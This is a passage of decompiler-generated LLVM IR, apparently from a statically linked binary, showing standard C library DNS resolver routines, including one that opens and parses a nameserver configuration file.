  %v1_10014394 = call i32 @__libc_close(i32 %v0_10014390)
  %v3_1001439c = icmp eq i32 %arg5, 0
  %v0_100143ac = load i32, i32* @r30, align 4
  br i1 %v3_1001439c, label %dec_label_pc_100143ac, label %dec_label_pc_100143a4

dec_label_pc_100143a4:                            ; preds = %dec_label_pc_10014390
  %v2_100143a4 = inttoptr i32 %arg5 to i32*
  store i32 %v0_100143ac, i32* %v2_100143a4, align 4
  br label %dec_label_pc_100143b4

dec_label_pc_100143ac:                            ; preds = %dec_label_pc_10014390
  store i32 %v0_100143ac, i32* @r3, align 4
  store i32 268518324, i32* @lr, align 4
  %v0_100143b0 = call i32 @free()
  br label %dec_label_pc_100143b4

dec_label_pc_100143b4:                            ; preds = %dec_label_pc_100143a4, %dec_label_pc_100143ac
  %v0_100143b4 = load i32, i32* @r21, align 4
  store i32 %v0_100143b4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  store i32 268518336, i32* @lr, align 4
  %v0_100143bc = call i32 @free()
  store i32 ptrtoint (i32* @global_var_10033950.538 to i32), i32* @r29, align 4
  br label %dec_label_pc_100144b8

dec_label_pc_100143d4:                            ; preds = %dec_label_pc_10014340
  %v1_100143d4 = inttoptr i32 %v0_10014340 to i32*
  %v2_100143d4 = load i32, i32* %v1_100143d4, align 4
  store i32 %v2_100143d4, i32* @r3, align 4
  store i32 268518364, i32* @lr, align 4
  %v0_100143d8 = call i32 @free()
  br label %dec_label_pc_100143dc

dec_label_pc_100143dc:                            ; preds = %dec_label_pc_100141ec, %dec_label_pc_10014154, %dec_label_pc_10014274, %dec_label_pc_1001426c, %dec_label_pc_1001416c, %dec_label_pc_10014134, %dec_label_pc_100143d4
  %v0_100143dc = load i32, i32* @r17, align 4
  %v3_100143dc = icmp eq i32 %v0_100143dc, 0
  br i1 %v3_100143dc, label %dec_label_pc_100143e4, label %dec_label_pc_10014434

dec_label_pc_100143e4:                            ; preds = %dec_label_pc_100143dc
  store i32 ptrtoint (i32* @global_var_1002eef0.422 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10013ee8, i32* %r28.global-to-local, align 4
  %v4_10014400 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268468572, i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  store i32 268518412, i32* @lr, align 4
  %v1_10014408 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  %v3_10014410 = load i32, i32* @global_var_1002f0a4.542, align 4
  store i32 %v2_10013ee8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001441c = add i32 %v3_10014410, -1
  store i32 %v1_1001441c, i32* @r29, align 4
  store i32 268518436, i32* @lr, align 4
  %v0_10014420 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10014424 = load i32, i32* @r22, align 4
  %v1_10014424 = load i32, i32* @r29, align 4
  %v2_10014424 = icmp slt i32 %v0_10014424, %v1_10014424
  br i1 %v2_10014424, label %dec_label_pc_1001442c, label %dec_label_pc_10014434

dec_label_pc_1001442c:                            ; preds = %dec_label_pc_100143e4
  %v1_1001442c = add i32 %v0_10014424, 1
  store i32 %v1_1001442c, i32* @r22, align 4
  br label %dec_label_pc_10014450thread-pre-split.backedge

dec_label_pc_10014450thread-pre-split.backedge:   ; preds = %dec_label_pc_1001442c, %dec_label_pc_100141d4, %dec_label_pc_1001444c
  %v0_10014450.pr = load i32, i32* @r18, align 4
  %tmp65 = icmp ult i32 %v0_10014450.pr, 3
  br i1 %tmp65, label %dec_label_pc_10013f44.lr.ph, label %dec_label_pc_10014468

dec_label_pc_10014434:                            ; preds = %dec_label_pc_100140e4, %dec_label_pc_100143e4, %dec_label_pc_100143dc, %dec_label_pc_100140fc
  %v0_10014434 = load i32, i32* @r26, align 4
  %v1_10014434 = add i32 %v0_10014434, 1
  store i32 %v1_10014434, i32* %r0.global-to-local, align 4
  %v1_10014438 = load i32, i32* @r23, align 4
  %v2_10014438 = srem i32 %v1_10014434, %v1_10014438
  store i32 %v2_10014438, i32* @r26, align 4
  %v5_10014440 = icmp eq i32 %v2_10014438, 0
  br i1 %v5_10014440, label %dec_label_pc_10014448, label %dec_label_pc_1001444c

dec_label_pc_10014448:                            ; preds = %dec_label_pc_10014434
  %v0_10014448 = load i32, i32* @r18, align 4
  %v1_10014448 = add i32 %v0_10014448, 1
  store i32 %v1_10014448, i32* @r18, align 4
  br label %dec_label_pc_1001444c

dec_label_pc_1001444c:                            ; preds = %dec_label_pc_10014434, %dec_label_pc_10014448
  store i32 -1, i32* @r22, align 4
  br label %dec_label_pc_10014450thread-pre-split.backedge

dec_label_pc_10013f44.lr.ph:                      ; preds = %dec_label_pc_10013f44.lr.ph.lr.ph, %dec_label_pc_10014450thread-pre-split.backedge
  br label %dec_label_pc_10013f44

dec_label_pc_1001445c:                            ; preds = %dec_label_pc_10013ebc, %dec_label_pc_10013eb4, %dec_label_pc_10013eac, %entry
  store i32 -1, i32* @r19, align 4
  store i32 -1, i32* @r26, align 4
  store i32 -1, i32* @r25, align 4
  br label %dec_label_pc_10014468

dec_label_pc_10014468:                            ; preds = %dec_label_pc_10014450thread-pre-split.backedge, %dec_label_pc_10013f54, %dec_label_pc_10014030, %dec_label_pc_100140f4, %dec_label_pc_10013ec8, %dec_label_pc_1001445c
  %v0_10014468 = call i32 @__GI___h_errno_location()
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10014470 = inttoptr i32 %v0_10014468 to i32*
  store i32 -1, i32* %v2_10014470, align 4
  %v0_10014474 = load i32, i32* @r25, align 4
  store i32 %v0_10014474, i32* @r20, align 4
  br label %dec_label_pc_10014478

dec_label_pc_10014478:                            ; preds = %dec_label_pc_10014214, %dec_label_pc_10014468
  %v0_10014478 = load i32, i32* @r19, align 4
  %v3_10014478 = icmp eq i32 %v0_10014478, -1
  br i1 %v3_10014478, label %dec_label_pc_10014488, label %dec_label_pc_10014480

dec_label_pc_10014480:                            ; preds = %dec_label_pc_10014478
  store i32 268518536, i32* @lr, align 4
  %v1_10014484 = call i32 @__libc_close(i32 %v0_10014478)
  br label %dec_label_pc_10014488

dec_label_pc_10014488:                            ; preds = %dec_label_pc_10014478, %dec_label_pc_10014480
  %v0_10014488 = load i32, i32* @r21, align 4
  store i32 %v0_10014488, i32* @r3, align 4
  store i32 -1, i32* @r27, align 4
  store i32 268518548, i32* @lr, align 4
  %v0_10014490 = call i32 @free()
  %v0_10014494 = load i32, i32* @r30, align 4
  store i32 %v0_10014494, i32* @r3, align 4
  store i32 268518556, i32* @lr, align 4
  %v0_10014498 = call i32 @free()
  %v0_1001449c = load i32, i32* @r26, align 4
  %v3_1001449c = icmp eq i32 %v0_1001449c, -1
  br i1 %v3_1001449c, label %dec_label_pc_100144e8, label %dec_label_pc_100144a4

dec_label_pc_100144a4:                            ; preds = %dec_label_pc_10014488
  store i32 ptrtoint (i32* @global_var_10033950.538 to i32), i32* @r29, align 4
  %v2_100144b0 = ptrtoint i32* %stack_var_-228 to i32
  br label %dec_label_pc_100144b8

dec_label_pc_100144b8:                            ; preds = %dec_label_pc_100143b4, %dec_label_pc_100144a4
  %storemerge68 = phi i32 [ %v2_100144b0, %dec_label_pc_100144a4 ], [ %v2_10013ee8, %dec_label_pc_100143b4 ]
  %v1_100144bc.pre-phi = phi i32 [ %v2_100144b0, %dec_label_pc_100144a4 ], [ %v2_10013ee8, %dec_label_pc_100143b4 ]
  store i32 %storemerge68, i32* %r28.global-to-local, align 4
  %v4_100144c0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 ptrtoint (i32* @global_var_10033950.538 to i32), i32 ptrtoint (i32* @global_var_10033950.538 to i32))
  %v0_100144c4 = load i32, i32* @r29, align 4
  store i32 268518604, i32* @lr, align 4
  %v1_100144c8 = call i32 @pthread_mutex_lock(i32 %v0_100144c4)
  %v0_100144d0 = load i32, i32* @r26, align 4
  store i32 %v0_100144d0, i32* @global_var_1002f09c.539, align 4
  store i32 %v1_100144bc.pre-phi, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_100144e0 = load i32, i32* @r20, align 4
  %v1_100144e0 = trunc i32 %v0_100144e0 to i16
  store i16 %v1_100144e0, i16* @global_var_1002eeec.540, align 2
  store i32 268518632, i32* @lr, align 4
  %v0_100144e4 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_100144e8

dec_label_pc_100144e8:                            ; preds = %dec_label_pc_10014488, %dec_label_pc_100144b8
  store i32 %v0_10013e68, i32* %r0.global-to-local, align 4
  %v0_100144ec = load i32, i32* @r27, align 4
  ret i32 %v0_100144ec

; uselistorder directives
  uselistorder i32 %v2_10014438, { 1, 0 }
  uselistorder i32 %v0_100143ac, { 1, 0 }
  uselistorder i32 %v1_10014388, { 1, 0 }
  uselistorder i32 %stack_var_-88.118, { 1, 0, 2 }
  uselistorder i32 %v0_10014254, { 1, 0 }
  uselistorder i32 %v1_10014378, { 1, 0 }
  uselistorder i32 %v0_10014340, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10014304, { 1, 0 }
  uselistorder i32 %v0_10014290, { 2, 1, 0 }
  uselistorder i32 %v0_1001422c, { 1, 0 }
  uselistorder i32 %v2_10014220, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10014144, { 1, 0 }
  uselistorder i32 %v1_10014044, { 1, 0 }
  uselistorder i32 %v1_10014018, { 1, 0 }
  uselistorder i32 %v1_10013fe4, { 1, 0 }
  uselistorder i32 %v1_10013f7c, { 1, 0 }
  uselistorder i32 %v2_10013ee8, { 0, 1, 4, 5, 2, 3, 6, 7, 8 }
  uselistorder i32* %stack_var_-228, { 4, 5, 1, 2, 3, 0, 6 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2, 3 }
  uselistorder i16* %stack_var_-212, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-184, { 1, 0, 2 }
  uselistorder i32 %tmp36, { 1, 0, 2 }
  uselistorder i32 %tmp35, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %tmp29, { 1, 0 }
  uselistorder i32 %tmp28, { 0, 2, 1 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 9, 10, 4, 5, 6, 7, 8 }
  uselistorder i32* %r28.global-to-local, { 0, 1, 2, 3, 8, 9, 4, 5, 6, 7 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 14, 4, 5, 6, 9, 7, 8, 10, 11, 12, 13, 34, 15, 0, 33, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_poll, { 0, 2, 1 }
  uselistorder i32 101, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 6, 5, 4, 3, 0, 1 }
  uselistorder i16 10, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @strncpy, { 2, 5, 1, 0, 4, 3 }
  uselistorder i16* @global_var_1002eeec.540, { 1, 0 }
  uselistorder i32 268468572, { 2, 0, 3, 1, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10033950.538 to i32), { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 1025, { 2, 3, 1, 4, 0 }
  uselistorder i32 512, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_100144e8, { 1, 0 }
  uselistorder label %dec_label_pc_100144b8, { 1, 0 }
  uselistorder label %dec_label_pc_10014488, { 1, 0 }
  uselistorder label %dec_label_pc_10014478, { 1, 0 }
  uselistorder label %dec_label_pc_10014468, { 5, 0, 3, 2, 1, 4 }
  uselistorder label %dec_label_pc_10013f44.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_1001444c, { 1, 0 }
  uselistorder label %dec_label_pc_10014434, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10014450thread-pre-split.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100143dc, { 6, 2, 3, 0, 4, 1, 5 }
  uselistorder label %dec_label_pc_100143b4, { 1, 0 }
  uselistorder label %dec_label_pc_10014390, { 2, 5, 4, 6, 3, 0, 1 }
  uselistorder label %dec_label_pc_10014388, { 1, 0 }
  uselistorder label %dec_label_pc_10014374, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100142e0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1001421c, { 1, 0 }
  uselistorder label %dec_label_pc_10014214, { 1, 0 }
  uselistorder label %dec_label_pc_100140b8, { 1, 0 }
  uselistorder label %dec_label_pc_10014030, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10013f54, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %v2_10014520 = ptrtoint i32* %stack_var_-200 to i32
  store i32 %v2_10014520, i32* %r3.global-to-local, align 4
  %v4_10014528 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-200, i32 add (i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 -32420), i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  store i32 ptrtoint (i32* @global_var_1002eef0.422 to i32), i32* %r3.global-to-local, align 4
  store i32 268518708, i32* @lr, align 4
  %v1_10014530 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002eef0.422 to i32))
  store i32 %v1_10014530, i32* %r3.global-to-local, align 4
  %v3_10014538 = load i32, i32* @global_var_1002f0a0.423, align 4
  %v2_1001453c = icmp sgt i32 %v3_10014538, 0
  br i1 %v2_1001453c, label %dec_label_pc_100147b4, label %dec_label_pc_10014544

dec_label_pc_10014544:                            ; preds = %entry
  store i32 ptrtoint ([17 x i8]* @global_var_1001a0a0.553 to i32), i32* %r3.global-to-local, align 4
  store i32 268518748, i32* @lr, align 4
  %v3_10014558 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_1001a0a0.553 to i32), i32 ptrtoint (i32* @global_var_1001a0b4.552 to i32))
  store i32 %v3_10014558, i32* %r3.global-to-local, align 4
  store i32 %v3_10014558, i32* @r26, align 4
  %v3_1001455c = icmp eq i32 %v3_10014558, 0
  br i1 %v3_1001455c, label %dec_label_pc_10014564, label %dec_label_pc_10014778.preheader

dec_label_pc_10014564:                            ; preds = %dec_label_pc_10014544
  %v0_10014568 = load i32, i32* @r31, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1001a0b8.554 to i32), i32* %r3.global-to-local, align 4
  store i32 268518772, i32* @lr, align 4
  %v3_10014570 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_1001a0b8.554 to i32), i32 %v0_10014568)
  store i32 %v3_10014570, i32* %r3.global-to-local, align 4
  store i32 %v3_10014570, i32* @r26, align 4
  %v3_10014574 = icmp eq i32 %v3_10014570, 0
  br i1 %v3_10014574, label %dec_label_pc_100147a8, label %dec_label_pc_10014778.preheader

dec_label_pc_10014778.preheader:                  ; preds = %dec_label_pc_10014544, %dec_label_pc_10014564
  %v0_1001478416 = phi i32 [ %v3_10014558, %dec_label_pc_10014544 ], [ %v3_10014570, %dec_label_pc_10014564 ]
  %v2_10014778 = ptrtoint i32* %stack_var_-164 to i32
  %v1_100145842 = bitcast i32* %stack_var_-164 to i8*
  %v3_10014668 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_10014778

dec_label_pc_10014580:                            ; preds = %dec_label_pc_10014598
  %v1_10014580 = add i32 %v0_100146409, 1
  store i32 %v1_10014580, i32* %r3.global-to-local, align 4
  %v1_10014584 = inttoptr i32 %v1_10014580 to i8*
  %v2_10014584 = load i8, i8* %v1_10014584, align 1
  %v3_10014584 = zext i8 %v2_10014584 to i32
  store i32 %v3_10014584, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_1001458c = icmp eq i8 %v2_10014584, 0
  %v1_10014590 = mul nuw nsw i32 %v3_10014584, 2
  store i32 %v1_10014590, i32* @r10, align 4
  br i1 %v3_1001458c, label %dec_label_pc_10014778.backedge, label %dec_label_pc_10014598

dec_label_pc_10014598:                            ; preds = %dec_label_pc_10014598.lr.ph, %dec_label_pc_10014580
  %v0_100145b0 = phi i32 [ %v3_100145844, %dec_label_pc_10014598.lr.ph ], [ %v3_10014584, %dec_label_pc_10014580 ]
  %v0_100146409 = phi i32 [ %v2_10014778, %dec_label_pc_10014598.lr.ph ], [ %v1_10014580, %dec_label_pc_10014580 ]
  %v0_1001459c = phi i32 [ %v1_100145908, %dec_label_pc_10014598.lr.ph ], [ %v1_10014590, %dec_label_pc_10014580 ]
  %v2_1001459c = add i32 %v0_1001459c, %v3_10014598.pre
  %v3_1001459c = inttoptr i32 %v2_1001459c to i16*
  %v4_1001459c = load i16, i16* %v3_1001459c, align 2
  %v1_100145a0 = and i16 %v4_1001459c, 32
  %v3_100145a0 = icmp eq i16 %v1_100145a0, 0
  br i1 %v3_100145a0, label %dec_label_pc_100145a8, label %dec_label_pc_10014580

dec_label_pc_100145a8:                            ; preds = %dec_label_pc_10014598
  %v3_100145a8 = icmp eq i32 %v0_100145b0, 10
  br i1 %v3_100145a8, label %dec_label_pc_10014778.backedge, label %dec_label_pc_100145b0

dec_label_pc_10014778.backedge:                   ; preds = %dec_label_pc_10014580, %dec_label_pc_1001472c, %dec_label_pc_10014734, %dec_label_pc_1001476c, %dec_label_pc_10014584.preheader, %dec_label_pc_100145a8, %dec_label_pc_100145b0, %dec_label_pc_100146d4
  %v0_10014784.pre = load i32, i32* @r26, align 4
  br label %dec_label_pc_10014778

dec_label_pc_100145b0:                            ; preds = %dec_label_pc_100145a8
  %v3_100145b0 = icmp eq i32 %v0_100145b0, 35
  br i1 %v3_100145b0, label %dec_label_pc_10014778.backedge, label %dec_label_pc_100145b8

dec_label_pc_100145b8:                            ; preds = %dec_label_pc_100145b0
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r10, align 4
  store i32 0, i32* @r27, align 4
  store i32 %v2_10014520, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001464010 = inttoptr i32 %v0_100146409 to i8*
  %v2_1001464011 = load i8, i8* %v1_1001464010, align 1
  %v3_1001464414 = icmp eq i8 %v2_1001464011, 0
  br i1 %v3_1001464414, label %dec_label_pc_10014654, label %dec_label_pc_1001464c

dec_label_pc_100145cc:                            ; preds = %dec_label_pc_1001464c
  %v1_100145cc = mul i32 %v0_100145cc, 4
  %v3_100145d0 = load i32, i32* @global_var_1002efac, align 4
  store i32 %v3_100145d0, i32* %r11.global-to-local, align 4
  %v1_100145d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_100145d4 = add i32 %v1_100145d4, %v1_100145cc
  %v2_100145d8 = add i32 %v2_100145d4, 16
  %v3_100145d8 = inttoptr i32 %v2_100145d8 to i32*
  store i32 %v0_100145d8, i32* %v3_100145d8, align 4
  %v0_100145e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100145e4

dec_label_pc_100145e0:                            ; preds = %dec_label_pc_100145f8
  %v1_100145e0 = add i32 %v0_100145e0, 1
  store i32 %v1_100145e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100145e4

dec_label_pc_100145e4:                            ; preds = %dec_label_pc_100145cc, %dec_label_pc_100145e0
  %v0_100145e0 = phi i32 [ %v0_100145e4.pre, %dec_label_pc_100145cc ], [ %v1_100145e0, %dec_label_pc_100145e0 ]
  %v1_100145e4 = inttoptr i32 %v0_100145e0 to i8*
  %v2_100145e4 = load i8, i8* %v1_100145e4, align 1
  %v3_100145e8 = icmp eq i8 %v2_100145e4, 0
  br i1 %v3_100145e8, label %dec_label_pc_10014614, label %dec_label_pc_100145f8

dec_label_pc_100145f8:                            ; preds = %dec_label_pc_100145e4
  %v3_100145f0 = icmp eq i8 %v2_100145e4, 10
  %v3_100145e4 = zext i8 %v2_100145e4 to i32
  %v1_100145ec = mul nuw nsw i32 %v3_100145e4, 2
  %v1_100145f8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100145f8 = add i32 %v1_100145f8, %v1_100145ec
  %v3_100145f8 = inttoptr i32 %v2_100145f8 to i16*
  %v4_100145f8 = load i16, i16* %v3_100145f8, align 2
  %v1_100145fc = and i16 %v4_100145f8, 32
  %v3_100145fc.not = icmp ne i16 %v1_100145fc, 0
  %brmerge = or i1 %v3_100145f0, %v3_100145fc.not
  br i1 %brmerge, label %dec_label_pc_10014614, label %dec_label_pc_100145e0

dec_label_pc_1001460c:                            ; preds = %dec_label_pc_10014628
  %v0_1001460c = load i32, i32* %r7.global-to-local, align 4
  %v1_1001460c = trunc i32 %v0_1001460c to i8
  store i8 %v1_1001460c, i8* %v1_10014614, align 1
  %v0_10014610 = load i32, i32* %r3.global-to-local, align 4
  %v1_10014610 = add i32 %v0_10014610, 1
  store i32 %v1_10014610, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10014614

dec_label_pc_10014614:                            ; preds = %dec_label_pc_100145f8, %dec_label_pc_100145e4, %dec_label_pc_1001460c
  %v0_10014640 = phi i32 [ %v1_10014610, %dec_label_pc_1001460c ], [ %v0_100145e0, %dec_label_pc_100145e4 ], [ %v0_100145e0, %dec_label_pc_100145f8 ]
  %v1_10014614 = inttoptr i32 %v0_10014640 to i8*
  %v2_10014614 = load i8, i8* %v1_10014614, align 1
  %v3_10014614 = zext i8 %v2_10014614 to i32
  %v3_10014618 = icmp eq i8 %v2_10014614, 0
  %v1_1001461c = mul nuw nsw i32 %v3_10014614, 2
  store i32 %v1_1001461c, i32* %r11.global-to-local, align 4
  br i1 %v3_10014618, label %dec_label_pc_1001463c, label %dec_label_pc_10014628

dec_label_pc_10014628:                            ; preds = %dec_label_pc_10014614
  %v3_10014620 = icmp eq i8 %v2_10014614, 10
  %v3_10014628 = load i32, i32* @global_var_1002efac, align 4
  %v2_1001462c = add i32 %v3_10014628, %v1_1001461c
  %v3_1001462c = inttoptr i32 %v2_1001462c to i16*
  %v4_1001462c = load i16, i16* %v3_1001462c, align 2
  %v1_10014630 = and i16 %v4_1001462c, 32
  %v3_10014630.not = icmp ne i16 %v1_10014630, 0
  %brmerge27 = or i1 %v3_10014620, %v3_10014630.not
  br i1 %brmerge27, label %dec_label_pc_1001460c, label %dec_label_pc_1001463c

dec_label_pc_1001463c:                            ; preds = %dec_label_pc_10014628, %dec_label_pc_10014614
  %v0_1001463c = load i32, i32* @r27, align 4
  %v1_1001463c = add i32 %v0_1001463c, 1
  store i32 %v1_1001463c, i32* @r27, align 4
  %v2_10014640 = load i8, i8* %v1_10014614, align 1
  %v3_10014644 = icmp eq i8 %v2_10014640, 0
  br i1 %v3_10014644, label %dec_label_pc_10014654, label %dec_label_pc_1001464c

dec_label_pc_1001464c:                            ; preds = %dec_label_pc_100145b8, %dec_label_pc_1001463c
  %v0_100145d8 = phi i32 [ %v0_10014640, %dec_label_pc_1001463c ], [ %v0_100146409, %dec_label_pc_100145b8 ]
  %v0_100145cc = phi i32 [ %v1_1001463c, %dec_label_pc_1001463c ], [ 0, %dec_label_pc_100145b8 ]
  %tmp33 = icmp slt i32 %v0_100145cc, 5
  br i1 %tmp33, label %dec_label_pc_100145cc, label %dec_label_pc_10014654

dec_label_pc_10014654:                            ; preds = %dec_label_pc_1001463c, %dec_label_pc_1001464c, %dec_label_pc_100145b8
  store i32 %tmp, i32* @r30, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1001a0d0.555 to i32), i32* @r4, align 4
  store i32 1, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v4_10014668 = call i32 @__GI_strcoll(i8* %v3_10014668, i32 ptrtoint ([11 x i8]* @global_var_1001a0d0.555 to i32))
  store i32 %v4_10014668, i32* %r3.global-to-local, align 4
  %v3_1001466c = icmp eq i32 %v4_10014668, 0
  br i1 %v3_1001466c, label %dec_label_pc_10014698, label %dec_label_pc_100146bc

dec_label_pc_10014678:                            ; preds = %dec_label_pc_100146b0
  %v1_10014678 = add i32 %v2_100146a0, 24
  %v2_10014678 = inttoptr i32 %v1_10014678 to i32*
  %v3_10014678 = load i32, i32* %v2_10014678, align 4
  store i32 %v3_10014678, i32* %r3.global-to-local, align 4
  store i32 268519040, i32* @lr, align 4
  %v1_1001467c = call i32 @__GI_strdup(i32 %v3_10014678)
  store i32 %v1_1001467c, i32* %r3.global-to-local, align 4
  %v0_10014684 = load i32, i32* @r29, align 4
  %v1_10014684 = add i32 %v0_10014684, 1
  store i32 %v1_10014684, i32* %r11.global-to-local, align 4
  %v1_10014688 = mul i32 %v0_10014684, 4
  store i32 %v1_10014684, i32* @global_var_1002f0a0.423, align 4
  %v3_10014694 = add i32 %v1_10014688, ptrtoint (i32* @global_var_10033c2c.424 to i32)
  %v4_10014694 = inttoptr i32 %v3_10014694 to i32*
  store i32 %v1_1001467c, i32* %v4_10014694, align 4
  br label %dec_label_pc_10014698

dec_label_pc_10014698:                            ; preds = %dec_label_pc_10014654, %dec_label_pc_10014678
  %v0_10014698 = load i32, i32* @r31, align 4
  %v1_10014698 = load i32, i32* @r27, align 4
  %v2_10014698 = icmp slt i32 %v0_10014698, %v1_10014698
  %v1_1001469c = mul i32 %v0_10014698, 4
  %v0_100146a0 = load i32, i32* @r1, align 4
  %v2_100146a0 = add i32 %v0_100146a0, %v1_1001469c
  br i1 %v2_10014698, label %dec_label_pc_100146b0, label %dec_label_pc_100146bc

dec_label_pc_100146b0:                            ; preds = %dec_label_pc_10014698
  %v3_100146b0 = load i32, i32* @global_var_1002f0a0.423, align 4
  %tmp35 = icmp slt i32 %v3_100146b0, 3
  br i1 %tmp35, label %dec_label_pc_10014678, label %dec_label_pc_100146bc

dec_label_pc_100146bc:                            ; preds = %dec_label_pc_100146b0, %dec_label_pc_10014698, %dec_label_pc_10014654
  %v0_100146c0 = load i32, i32* @r30, align 4
  store i32 %v0_100146c0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a0dc.556 to i32), i32* @r4, align 4
  %v3_100146c8 = inttoptr i32 %v0_100146c0 to i8*
  %v4_100146c8 = call i32 @__GI_strcoll(i8* %v3_100146c8, i32 ptrtoint ([7 x i8]* @global_var_1001a0dc.556 to i32))
  store i32 %v4_100146c8, i32* %r3.global-to-local, align 4
  %v3_100146cc = icmp eq i32 %v4_100146c8, 0
  br i1 %v3_100146cc, label %dec_label_pc_1001470c.preheader, label %dec_label_pc_100146d4

dec_label_pc_100146d4:                            ; preds = %dec_label_pc_100146bc
  %v0_100146d8 = load i32, i32* @r30, align 4
  store i32 %v0_100146d8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a0e4.557 to i32), i32* @r4, align 4
  %v3_100146e0 = inttoptr i32 %v0_100146d8 to i8*
  %v4_100146e0 = call i32 @__GI_strcoll(i8* %v3_100146e0, i32 ptrtoint ([7 x i8]* @global_var_1001a0e4.557 to i32))
  store i32 %v4_100146e0, i32* %r3.global-to-local, align 4
  %v3_100146e4 = icmp eq i32 %v4_100146e0, 0
  br i1 %v3_100146e4, label %dec_label_pc_1001470c.preheader, label %dec_label_pc_10014778.backedge

dec_label_pc_1001470c.preheader:                  ; preds = %dec_label_pc_100146bc, %dec_label_pc_100146d4
  store i32 ptrtoint (i32* @global_var_10033c1c.544 to i32), i32* @r31, align 4
  %v3_1001471841 = load i32, i32* @global_var_1002f0a4.542, align 4
  %v2_1001471c43 = icmp sgt i32 %v3_1001471841, 0
  %v1_1001472045 = add i32 %v3_1001471841, -1
  %v1_1001472446 = mul i32 %v1_1001472045, 4
  store i32 %v1_1001472446, i32* %r11.global-to-local, align 4
  br i1 %v2_1001471c43, label %dec_label_pc_100146f0, label %dec_label_pc_1001472c

dec_label_pc_100146f0:                            ; preds = %dec_label_pc_1001470c.preheader, %dec_label_pc_100146f0
  %v1_1001472448 = phi i32 [ %v1_10014724, %dec_label_pc_100146f0 ], [ %v1_1001472446, %dec_label_pc_1001470c.preheader ]
  %v1_1001472047 = phi i32 [ %v1_10014720, %dec_label_pc_100146f0 ], [ %v1_1001472045, %dec_label_pc_1001470c.preheader ]
  %v2_100146f0 = add i32 %v1_1001472448, ptrtoint (i32* @global_var_10033c1c.544 to i32)
  %v3_100146f0 = inttoptr i32 %v2_100146f0 to i32*
  %v4_100146f0 = load i32, i32* %v3_100146f0, align 4
  store i32 %v4_100146f0, i32* @r3, align 4
  store i32 %v1_1001472047, i32* @global_var_1002f0a4.542, align 4
  store i32 268519164, i32* @lr, align 4
  %v0_100146f8 = call i32 @free()
  store i32 %v0_100146f8, i32* %r3.global-to-local, align 4
  %v3_100146fc = load i32, i32* @global_var_1002f0a4.542, align 4
  %v1_10014704 = mul i32 %v3_100146fc, 4
  %v1_10014708 = load i32, i32* @r31, align 4
  %v3_10014708 = add i32 %v1_10014708, %v1_10014704
  %v4_10014708 = inttoptr i32 %v3_10014708 to i32*
  store i32 0, i32* %v4_10014708, align 4
  store i32 ptrtoint (i32* @global_var_10033c1c.544 to i32), i32* @r31, align 4
  %v3_10014718 = load i32, i32* @global_var_1002f0a4.542, align 4
  %v2_1001471c = icmp sgt i32 %v3_10014718, 0
